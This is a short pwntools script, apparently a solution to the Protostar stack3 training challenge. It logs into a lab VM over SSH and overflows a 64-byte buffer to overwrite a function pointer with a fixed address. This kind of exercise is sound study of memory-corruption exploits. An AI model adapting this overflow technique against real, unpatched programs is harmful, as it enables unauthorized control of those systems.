from pwn import *



r = ssh(host='192.168.160.128', user='user', password='user')

my_pg = r.run(['/opt/protostar/bin/stack3'])
payload = b'A'*64 + p32(0x08048424)
my_pg.sendline(payload)

print(my_pg.recvline())
print(my_pg.recvline())

